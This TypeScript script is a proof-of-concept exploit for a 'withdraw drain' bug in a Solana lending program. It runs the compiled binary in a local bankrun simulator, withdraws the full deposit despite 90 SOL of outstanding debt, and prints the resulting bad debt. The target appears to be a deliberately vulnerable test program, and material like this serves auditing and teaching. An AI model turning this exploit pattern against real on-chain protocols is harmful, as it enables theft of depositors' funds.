/**
 * BANKRUN EXPLOIT: Withdraw Drain (SEM-002)
 *
 * Vulnerability: The withdraw() function checks `user.deposited >= amount` but
 * does NOT verify that remaining deposits still cover outstanding borrows.
 * Attack: deposit 100 -> borrow 90 -> withdraw 100 -> profit 90 SOL.
 *
 * This exploit runs against the COMPILED SBF binary via solana-bankrun.
 */

import { start } from "solana-bankrun";
import {
  PublicKey,
  Transaction,
  TransactionInstruction,
  SystemProgram,
  Keypair,
  LAMPORTS_PER_SOL,
} from "@solana/web3.js";
import * as crypto from "crypto";

const PROGRAM_ID = new PublicKey("BJYyF44xEVBfZDQwRdQ2d2ErjWoESsgaXHVcSw7MAv8K");

function ixDisc(name: string): Buffer {
  return Buffer.from(
    crypto.createHash("sha256").update(`global:${name}`).digest()
  ).subarray(0, 8);
}

function accDisc(name: string): Buffer {
  return Buffer.from(
    crypto.createHash("sha256").update(`account:${name}`).digest()
  ).subarray(0, 8);
}

function encodeU64(val: number | bigint): Buffer {
  const buf = Buffer.alloc(8);
  buf.writeBigUInt64LE(BigInt(val));
  return buf;
}

function encodeU16(val: number): Buffer {
  const buf = Buffer.alloc(2);
  buf.writeUInt16LE(val);
  return buf;
}

async function main() {
  console.log("═══════════════════════════════════════════════════════════");
  console.log(" EXPLOIT: Withdraw Drain (SEM-002)");
  console.log(" Target: vulnerable_lending::withdraw()");
  console.log(" Binary: vuln_lending.so (compiled SBF)");
  console.log("═══════════════════════════════════════════════════════════");
  console.log();

  const poolKp = Keypair.generate();
  const userAccountKp = Keypair.generate();

  const [vaultPda, vaultBump] = PublicKey.findProgramAddressSync(
    [Buffer.from("vault"), poolKp.publicKey.toBuffer()],
    PROGRAM_ID
  );

  const RENT_POOL = 1113600;
  const RENT_USER = 1089600;

  const authorityKp = Keypair.generate();

  // Pool: 500 SOL from other users + 100 SOL from attacker = 600 total
  const poolData = Buffer.concat([
    accDisc("Pool"),
    authorityKp.publicKey.toBuffer(),
    encodeU64(600 * LAMPORTS_PER_SOL),  // total_deposits
    encodeU64(90 * LAMPORTS_PER_SOL),   // total_borrows (attacker already borrowed 90)
    encodeU16(500),
    Buffer.from([vaultBump]),
  ]);

  // UserAccount: attacker has deposited 100, already borrowed 90
  const userDummyOwner = Keypair.generate();
  const userData = Buffer.concat([
    accDisc("UserAccount"),
    userDummyOwner.publicKey.toBuffer(),
    encodeU64(100 * LAMPORTS_PER_SOL),   // deposited
    encodeU64(90 * LAMPORTS_PER_SOL),    // borrowed — 90 SOL outstanding
  ]);

  // Vault has 510 SOL (600 - 90 already borrowed out)
  const context = await start(
    [{ name: "vuln_lending", programId: PROGRAM_ID }],
    [
      { address: poolKp.publicKey, info: { lamports: RENT_POOL, data: poolData, owner: PROGRAM_ID, executable: false } },
      { address: userAccountKp.publicKey, info: { lamports: RENT_USER, data: userData, owner: PROGRAM_ID, executable: false } },
      { address: vaultPda, info: { lamports: 510 * LAMPORTS_PER_SOL, data: Buffer.alloc(0), owner: SystemProgram.programId, executable: false } },
    ]
  );

  const client = context.banksClient;
  const payer = context.payer;

  // Fix user owner to payer
  const fixedUserData = Buffer.concat([
    accDisc("UserAccount"),
    payer.publicKey.toBuffer(),
    encodeU64(100 * LAMPORTS_PER_SOL),
    encodeU64(90 * LAMPORTS_PER_SOL),
  ]);
  context.setAccount(userAccountKp.publicKey, {
    lamports: RENT_USER,
    data: fixedUserData,
    owner: PROGRAM_ID,
    executable: false,
  });

  console.log("[1] State setup (simulates: attacker deposited 100, borrowed 90):");
  console.log("    Pool: deposits=600 SOL, borrows=90 SOL");
  console.log("    User: deposited=100 SOL, borrowed=90 SOL");
  console.log("    Vault: 510 SOL");
  console.log();

  // Record payer balance before exploit
  const balBefore = await client.getBalance(payer.publicKey);

  // === EXPLOIT: Withdraw full deposit despite 90 SOL outstanding debt ===
  console.log("[2] EXPLOIT: Withdrawing 100 SOL despite 90 SOL outstanding debt...");

  const withdrawIx = new TransactionInstruction({
    programId: PROGRAM_ID,
    keys: [
      { pubkey: poolKp.publicKey, isSigner: false, isWritable: true },
      { pubkey: userAccountKp.publicKey, isSigner: false, isWritable: true },
      { pubkey: payer.publicKey, isSigner: true, isWritable: true },
      { pubkey: vaultPda, isSigner: false, isWritable: true },
      { pubkey: SystemProgram.programId, isSigner: false, isWritable: false },
    ],
    data: Buffer.concat([ixDisc("withdraw"), encodeU64(100 * LAMPORTS_PER_SOL)]),
  });

  const [latestBlockhash] = await client.getLatestBlockhash();
  const tx = new Transaction();
  tx.recentBlockhash = latestBlockhash;
  tx.feePayer = payer.publicKey;
  tx.add(withdrawIx);
  tx.sign(payer);

  let withdrawSucceeded = false;
  try {
    await client.processTransaction(tx);
    withdrawSucceeded = true;
    console.log("    Withdrawal SUCCEEDED (should have been blocked)");
  } catch (e: any) {
    console.log(`    Withdrawal BLOCKED: ${(e.message || String(e)).substring(0, 100)}`);
  }

  // === Read final state ===
  console.log();
  console.log("[3] Reading final account state...");

  const finalUser = await client.getAccount(userAccountKp.publicKey);
  const finalUserData = Buffer.from(finalUser!.data);
  const finalDeposited = Number(finalUserData.readBigUInt64LE(40)) / LAMPORTS_PER_SOL;
  const finalBorrowed = Number(finalUserData.readBigUInt64LE(48)) / LAMPORTS_PER_SOL;
  const balAfter = await client.getBalance(payer.publicKey);
  const solGained = Number(balAfter - balBefore) / LAMPORTS_PER_SOL;

  console.log(`    Deposited (on-chain): ${finalDeposited} SOL`);
  console.log(`    Borrowed (outstanding): ${finalBorrowed} SOL`);
  console.log(`    Collateral remaining: ${finalDeposited} SOL`);
  console.log(`    Attacker SOL gained: ${solGained.toFixed(4)} SOL`);

  // === Verdict ===
  console.log();
  if (withdrawSucceeded && finalBorrowed > 0 && finalDeposited === 0) {
    console.log("═══════════════════════════════════════════════════════════");
    console.log(` >>> EXPLOIT CONFIRMED on compiled SBF binary <<<`);
    console.log(` Deposited 100 SOL -> Borrowed 90 SOL -> Withdrew 100 SOL`);
    console.log(` Protocol has ${finalBorrowed} SOL bad debt with 0 collateral`);
    console.log(` Attacker gained ~${solGained.toFixed(1)} SOL net (90 SOL stolen)`);
    console.log("═══════════════════════════════════════════════════════════");
  } else if (!withdrawSucceeded) {
    console.log("  Exploit did NOT confirm — withdrawal was properly blocked.");
  }
}

main().catch((e) => {
  console.error("Exploit execution error:", e);
  process.exit(1);
});
